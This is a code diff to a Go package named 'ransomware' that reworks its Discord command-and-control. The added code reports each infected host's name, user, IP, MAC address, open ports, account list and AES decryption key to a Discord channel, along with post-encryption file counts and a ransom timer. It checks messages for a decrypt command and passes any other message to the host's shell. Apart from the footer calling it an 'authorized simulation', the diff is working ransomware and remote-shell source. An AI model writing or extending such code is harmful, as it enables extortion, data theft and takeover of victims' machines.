@@ -1,12 +1,11 @@
 package ransomware
 
 import (
-	"crypto/rand"
-	"encoding/hex"
 	"fmt"
 	"net"
 	"os/exec"
 	"runtime"
+	"sort"
 	"strings"
 	"time"
 
@@ -70,9 +69,7 @@ func GenDC(encKey, decKey string) (string, error) {
 		fmt.Printf("Warning: Could not make channel private: %v\n", err)
 	}
 
-	message := formatVictimMessage(victim)
-
-	_, err = dg.ChannelMessageSend(channel.ID, message)
+	_, err = dg.ChannelMessageSendEmbed(channel.ID, buildInfectionEmbed(victim))
 	if err != nil {
 		return "", fmt.Errorf("failed to send message: %v", err)
 	}
@@ -80,6 +77,183 @@ func GenDC(encKey, decKey string) (string, error) {
 	fmt.Printf("[✓] Data sent to Discord C2 - Channel: #%s\n", channelName)
 
 	return channel.ID, nil
+}
+
+func buildInfectionEmbed(v VictimInfo) *discordgo.MessageEmbed {
+	usersBlock := strings.TrimSpace(v.Users)
+	if usersBlock == "" {
+		usersBlock = "(unavailable)"
+	}
+	usersBlock = sanitizeCodeFenceContent(usersBlock)
+	if len(usersBlock) > 3500 {
+		usersBlock = usersBlock[:3497] + "..."
+	}
+
+	keyLine := "||" + v.DecryptionKey + "||"
+
+	return &discordgo.MessageEmbed{
+		Title:       "Infection · primary report",
+		Description: "Symmetric **AES-256-GCM**. One hex secret for both directions. A **second embed** lands when the disk pass finishes (counts, bytes, extension mix).",
+		Color:       0xC0392B,
+		Fields: []*discordgo.MessageEmbedField{
+			{
+				Name: "Host",
+				Value: fmt.Sprintf(
+					"**Name:** %s\n**User:** %s\n**Recorded:** %s",
+					v.Hostname, v.Username, v.Timestamp,
+				),
+				Inline: false,
+			},
+			{
+				Name: "Network",
+				Value: fmt.Sprintf(
+					"**IP:** %s\n**MAC:** %s\n**Listening (common ports):** %s",
+					v.IP, v.MAC, v.OpenPorts,
+				),
+				Inline: false,
+			},
+			{Name: "OS", Value: v.OS, Inline: true},
+			{
+				Name:   "Accounts / enumeration",
+				Value:  "```\n" + usersBlock + "\n```",
+				Inline: false,
+			},
+			{
+				Name: "Secret key (spoiler — tap to reveal)",
+				Value: keyLine + "\n• 64 hex chars · same value encrypts and decrypts\n• Also written on disk when possible (see stats embed)",
+				Inline: false,
+			},
+			{
+				Name: "Remote decrypt (this channel)",
+				Value: "Send exactly:\n```\nDECRYPT <paste_hex_here>\n```\nNo angle brackets. Key must match the spoiler above.",
+				Inline: false,
+			},
+			{
+				Name: "Local decrypt (decrypt.exe from builder)",
+				Value: "• `decrypt.exe <hex>`\n• Or omit argv and use key file:\n  - Windows: `%APPDATA%\\decryption_key.txt`\n  - Linux: `/tmp/.decryption_key`",
+				Inline: false,
+			},
+		},
+		Footer: &discordgo.MessageEmbedFooter{Text: "ECLIPSE · authorized simulation only"},
+	}
+}
+
+func SendEncryptionStatsEmbed(channelID string) error {
+	if err := utils.EnsureDiscordConfig(); err != nil {
+		return err
+	}
+
+	dg, err := discordgo.New("Bot " + utils.DiscordBotToken)
+	if err != nil {
+		return err
+	}
+	defer dg.Close()
+
+	elapsed := time.Since(EncryptStatsStarted)
+	if EncryptStatsStarted.IsZero() {
+		elapsed = 0
+	}
+
+	topExt := formatTopExtensions(14)
+	if encryptStatsByExt == nil {
+		topExt = "_(no data)_"
+	}
+
+	host := utils.GetHostname()
+	avg := "—"
+	if EncryptStatsFiles > 0 {
+		avg = humanBytes(EncryptStatsBytes / int64(EncryptStatsFiles))
+	}
+
+	embed := &discordgo.MessageEmbed{
+		Title:       "Encryption pass · telemetry",
+		Description: fmt.Sprintf("**%s** — post-run inventory for this execution.", host),
+		Color:       0xE67E22,
+		Fields: []*discordgo.MessageEmbedField{
+			{Name: "Files encrypted", Value: fmt.Sprintf("%d", EncryptStatsFiles), Inline: true},
+			{Name: "I/O failures", Value: fmt.Sprintf("%d", EncryptStatsFailed), Inline: true},
+			{Name: "Plaintext bytes", Value: humanBytes(EncryptStatsBytes), Inline: true},
+			{Name: "Wall time", Value: elapsed.Round(time.Second).String(), Inline: true},
+			{Name: "Mean file size", Value: avg, Inline: true},
+			{Name: "Ransom timer", Value: fmt.Sprintf("%d h", RANSOM_HOURS), Inline: true},
+			{Name: "Extensions (top)", Value: truncateField(topExt, 1024), Inline: false},
+			{Name: "Key file (victim)", Value: keyFileLocationText(), Inline: false},
+		},
+		Footer:    &discordgo.MessageEmbedFooter{Text: fmt.Sprintf("%d paths tracked in-session", len(encryptedFiles))},
+		Timestamp: time.Now().Format(time.RFC3339),
+	}
+
+	_, err = dg.ChannelMessageSendEmbed(channelID, embed)
+	return err
+}
+
+func keyFileLocationText() string {
+	if runtime.GOOS == "windows" {
+		return "`%APPDATA%\\decryption_key.txt`"
+	}
+	return "`/tmp/.decryption_key`"
+}
+
+func humanBytes(n int64) string {
+	if n < 0 {
+		n = 0
+	}
+	suffixes := []string{"B", "KiB", "MiB", "GiB", "TiB", "PiB", "EiB"}
+	v := float64(n)
+	const base = 1024.0
+	i := 0
+	for v >= base && i < len(suffixes)-1 {
+		v /= base
+		i++
+	}
+	if i == 0 {
+		return fmt.Sprintf("%d B", n)
+	}
+	return fmt.Sprintf("%.2f %s", v, suffixes[i])
+}
+
+func formatTopExtensions(max int) string {
+	type pair struct {
+		ext string
+		n   int
+	}
+	var list []pair
+	for e, n := range encryptStatsByExt {
+		list = append(list, pair{e, n})
+	}
+	sort.Slice(list, func(i, j int) bool {
+		if list[i].n != list[j].n {
+			return list[i].n > list[j].n
+		}
+		return list[i].ext < list[j].ext
+	})
+	var b strings.Builder
+	for i, p := range list {
+		if i >= max {
+			fmt.Fprintf(&b, "\n_…and %d more types_", len(list)-max)
+			break
+		}
+		if i > 0 {
+			b.WriteByte('\n')
+		}
+		fmt.Fprintf(&b, "`%s` × **%d**", p.ext, p.n)
+	}
+	if b.Len() == 0 {
+		return "_(none)_"
+	}
+	return b.String()
+}
+
+func truncateField(s string, max int) string {
+	if len(s) <= max {
+		return s
+	}
+	return s[:max-3] + "..."
+}
+
+func sanitizeCodeFenceContent(s string) string {
+	s = strings.ReplaceAll(s, "```", "`\u200b``")
+	return s
 }
 
 func StartDiscordC2(channelID, decKey string) {
@@ -129,20 +303,19 @@ func checkForCommands(dg *discordgo.Session, channelID, decKey string) {
 
 	command := strings.TrimSpace(latestMsg.Content)
 
-	if strings.HasPrefix(strings.ToUpper(command), "DECRYPT ") {
-		providedKey := strings.TrimPrefix(command, "DECRYPT ")
-		providedKey = strings.TrimPrefix(providedKey, "decrypt ")
-		providedKey = strings.TrimSpace(providedKey)
+	if len(command) >= 8 && strings.EqualFold(command[:8], "decrypt ") {
+		providedKey := normalizeDiscordHexKey(command[8:])
+		want := normalizeDiscordHexKey(decKey)
 
-		if providedKey == decKey {
-			dg.ChannelMessageSend(channelID, "✅ **Decryption key accepted! Starting decryption...**")
+		if strings.EqualFold(providedKey, want) {
+			dg.ChannelMessageSend(channelID, "✅ **Decryption key accepted. Starting decryption...**")
 			DecryptSystem()
-			dg.ChannelMessageSend(channelID, "✅ **System decrypted successfully!**")
-			return
-		} else {
-			dg.ChannelMessageSend(channelID, "❌ **Invalid decryption key!**")
+			dg.ChannelMessageSend(channelID, "✅ **Decryption pass finished.**")
 			return
 		}
+
+		dg.ChannelMessageSend(channelID, "❌ **Key mismatch.** Copy the full 64-character hex from the spoiler (no spaces).")
+		return
 	}
 
 	output := executeCommand(command)
@@ -168,10 +341,10 @@ func executeCommand(command string) string {
 }
 
 func sendCommandOutput(dg *discordgo.Session, channelID, command, output string) {
-	const MAX_LENGTH = 1900
+	const maxLength = 1900
 
-	if len(output) > MAX_LENGTH {
-		output = output[:MAX_LENGTH] + "\n... (output truncated)"
+	if len(output) > maxLength {
+		output = output[:maxLength] + "\n... (output truncated)"
 	}
 
 	if output == "" {
@@ -182,8 +355,6 @@ func sendCommandOutput(dg *discordgo.Session, channelID, command, output string)
 
 	dg.ChannelMessageSend(channelID, message)
 }
-
-
 
 func getUsersAndPermissions() string {
 	var cmd *exec.Cmd
@@ -245,52 +416,9 @@ func generateChannelName(v VictimInfo) string {
 	return "infected-" + v.Hostname + "-" + fmt.Sprintf("%d", time.Now().Unix())
 }
 
-func formatVictimMessage(v VictimInfo) string {
-	return fmt.Sprintf(`
-🔴 **NEW INFECTION DETECTED** 🔴
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-**📍 SYSTEM INFORMATION**
-- **Hostname:** %s
-- **IP Address:** %s
-- **MAC Address:** %s
-- **OS:** %s
-- **Username:** %s
-- **Infection Time:** %s
-
-**👥 USERS ON SYSTEM**
-%s`+"```\n"+`
-
-**🔓 OPEN PORTS**
-%s
-
-**🔐 ENCRYPTION KEYS**
-⚠️ **Keep these keys secure!** ⚠️
-
-- **Encryption Key:** ||%s||
-- **Decryption Key:** ||%s||
-
-*(Click to reveal)*
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-**Terminal of the user:**
-Type commands below...
-`,
-		v.Hostname,
-		v.IP,
-		v.MAC,
-		v.OS,
-		v.Username,
-		v.Timestamp,
-		v.Users,
-		v.OpenPorts,
-		v.EncryptionKey,
-		v.DecryptionKey,
-	)
-}
-
-func generateEncryptionKey() string {
-	key := make([]byte, 32)
-	rand.Read(key)
-	return hex.EncodeToString(key)
+func normalizeDiscordHexKey(s string) string {
+	s = strings.TrimSpace(s)
+	s = strings.ReplaceAll(s, " ", "")
+	s = strings.TrimPrefix(strings.TrimPrefix(s, "0x"), "0X")
+	return s
 }
